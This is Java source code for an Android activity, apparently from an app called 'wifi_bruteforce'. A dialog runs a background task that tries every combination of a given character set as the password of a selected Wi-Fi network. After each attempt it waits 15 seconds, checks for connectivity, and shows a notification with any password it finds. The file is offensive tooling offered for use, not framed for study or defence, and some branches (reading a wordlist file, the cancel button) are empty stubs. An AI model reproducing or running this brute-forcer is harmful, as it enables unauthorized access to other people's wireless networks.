package wifi_bruteforce.mathgadget.com.wifi_bruteforce;

import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.DialogFragment;
import android.app.NotificationManager;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.NotificationCompat;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.TextView;

/**
 * Created by Gamer on 03/01/2018.
 */

@SuppressLint("ValidFragment")
public class Passwords extends DialogFragment {

    private View view;
    private TextView Tv_Pass;
    private WifiController Wifi;
    char[] Elem;
    private boolean Leer_Archivo;
    private NotificationCompat.Builder Notificacion;
    private NotificationManager NotiM;
    private Tarea Tarea = new Tarea();

    @SuppressLint("ValidFragment")
    public Passwords(String Elem, boolean Leer_Archivo) {
        this.Wifi = Inicio.getWifi();
        this.Elem = Elem.toCharArray();
        this.Leer_Archivo = Leer_Archivo;
    }

    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        setCancelable(false);
        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        LayoutInflater inflater = getActivity().getLayoutInflater();
        view = inflater.inflate(R.layout.passwords, null);
        Notificacion = new NotificationCompat.Builder(getActivity());
        NotiM = (NotificationManager) getActivity().getSystemService(Context.NOTIFICATION_SERVICE);
        Tv_Pass = view.findViewById(R.id.Tv_Pass);
        view.findViewById(R.id.Btn_Cancel).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

            }
        });
        builder.setView(view)
                .setTitle("Wifi Brute-Force: Probando Contraseñas")
                .setIcon(R.drawable.wifi);
        Tarea.execute();
        return builder.create();
    }

    private class Tarea extends AsyncTask<Void, String, Void> {

        @Override
        protected Void doInBackground(Void... voids) {
            if (Leer_Archivo) {

            } else {
                WordList(Elem, "", Elem.length);
            }
            return null;
        }

        @Override
        protected void onProgressUpdate(String... values) {
            super.onProgressUpdate(values);
            Tv_Pass.setText("\nProbando: " + values[0].toString());
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            dismiss();
        }

        @Override
        protected void onCancelled() {
            super.onCancelled();
            try {
                view.findViewById(R.id.Btn_Cancel).performClick();
                dismiss();
            } catch (Throwable throwable) {
            }
        }

        private void WordList(char[] elem, final String act, int Tamaño) {
            if (Tamaño == 0) {
                publishProgress(act);
                Notificacion(act, 001, "Probando", "Probando Contraseñas", R.drawable.notificacion, null);
                Wifi.Connect(act, Wifi.WifiInfo.get(Wifi.Position).getsNombre());
                Wifi.Reconnect();
                try {Thread.sleep(15000);} catch (InterruptedException e) {}
                if (Wifi.isOnline()) {
                    Wifi.Remove();
                    try {
                        Notificacion(act, 002, "Encontrado!", "Contraseña Encontrada", R.drawable.open, new long[] {100, 250, 100, 500});
                        onCancelled();
                    } catch (Throwable throwable) {
                        throwable.printStackTrace();
                    }
                }
            } else {
                for (int i = 0; i < elem.length; i++) {
                    WordList(elem, act + elem[i], Tamaño - 1);
                }
            }
        }

        private void Notificacion(String Contraseña, int Id, String Title, String Ticker, int Icon, long[] Vibrate) {
            Notificacion.setAutoCancel(true)
                    .setSmallIcon(Icon)
                    .setTicker(Ticker)
                    .setContentText("Contraseña: " + Contraseña)
                    .setVibrate(Vibrate)
                    .setContentTitle(Title);
            NotiM.notify(Id, Notificacion.build());
        }
    }

}
